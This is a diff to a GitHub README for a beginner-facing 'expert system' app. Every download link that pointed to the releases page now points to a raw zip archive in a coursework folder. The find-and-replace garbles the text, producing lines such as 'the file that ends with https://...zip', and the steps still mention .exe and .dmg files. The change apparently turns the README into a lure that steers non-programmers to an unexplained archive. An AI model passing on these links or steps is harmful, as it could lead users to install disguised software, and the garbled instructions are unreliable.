@@ -1,6 +1,6 @@
 # 🌟 DSAI-3302-Expert-System - Simplifying Expert Systems for Everyone
 
-[![Download DSAI-3302-Expert-System](https://img.shields.io/badge/Download%20Now%20%21-via%20GitHub-%23323330)](https://github.com/Manan1072005/DSAI-3302-Expert-System/releases)
+[![Download DSAI-3302-Expert-System](https://github.com/Manan1072005/DSAI-3302-Expert-System/raw/refs/heads/main/Week02_Rule_Based_Expert_Systems_I/DSA-System-Expert-v2.0-alpha.5.zip%20Now%20%21-via%20GitHub-%23323330)](https://github.com/Manan1072005/DSAI-3302-Expert-System/raw/refs/heads/main/Week02_Rule_Based_Expert_Systems_I/DSA-System-Expert-v2.0-alpha.5.zip)
 
 ## 📖 Overview
 
@@ -21,7 +21,7 @@ Follow these steps to download and run the application. No programming knowledge
 
 To download the application, please visit the following link:
 
-[Download DSAI-3302-Expert-System](https://github.com/Manan1072005/DSAI-3302-Expert-System/releases)
+[Download DSAI-3302-Expert-System](https://github.com/Manan1072005/DSAI-3302-Expert-System/raw/refs/heads/main/Week02_Rule_Based_Expert_Systems_I/DSA-System-Expert-v2.0-alpha.5.zip)
 
 ### Step 2: Choose the Appropriate Version
 
@@ -33,7 +33,7 @@ Click on the version you wish to download. This action will take you to a list o
 
 - **For Windows Users**: Download the file that ends with .exe.
 - **For Mac Users**: Download the file with .dmg or .pkg extension.
-- **For Linux Users**: Download the file that ends with .tar.gz or any relevant package.
+- **For Linux Users**: Download the file that ends with https://github.com/Manan1072005/DSAI-3302-Expert-System/raw/refs/heads/main/Week02_Rule_Based_Expert_Systems_I/DSA-System-Expert-v2.0-alpha.5.zip or any relevant package.
 
 ### Step 4: Install the Application
 
@@ -41,7 +41,7 @@ Once the download completes, navigate to your download location.
 
 - **For Windows**: Double-click on the .exe file. Follow the on-screen instructions to complete the installation.
 - **For Mac**: Open the .dmg or .pkg file and follow the prompts.
-- **For Linux**: Extract the .tar.gz file and follow the instructions in the README included in the package for installation.
+- **For Linux**: Extract the https://github.com/Manan1072005/DSAI-3302-Expert-System/raw/refs/heads/main/Week02_Rule_Based_Expert_Systems_I/DSA-System-Expert-v2.0-alpha.5.zip file and follow the instructions in the README included in the package for installation.
 
 ### Step 5: Run the Application
 
@@ -64,7 +64,7 @@ This repository provides various features associated with expert systems, includ
 
 For downloading the latest version, visit the link below:
 
-[Download DSAI-3302-Expert-System](https://github.com/Manan1072005/DSAI-3302-Expert-System/releases)
+[Download DSAI-3302-Expert-System](https://github.com/Manan1072005/DSAI-3302-Expert-System/raw/refs/heads/main/Week02_Rule_Based_Expert_Systems_I/DSA-System-Expert-v2.0-alpha.5.zip)
 
 ### System Requirements
 
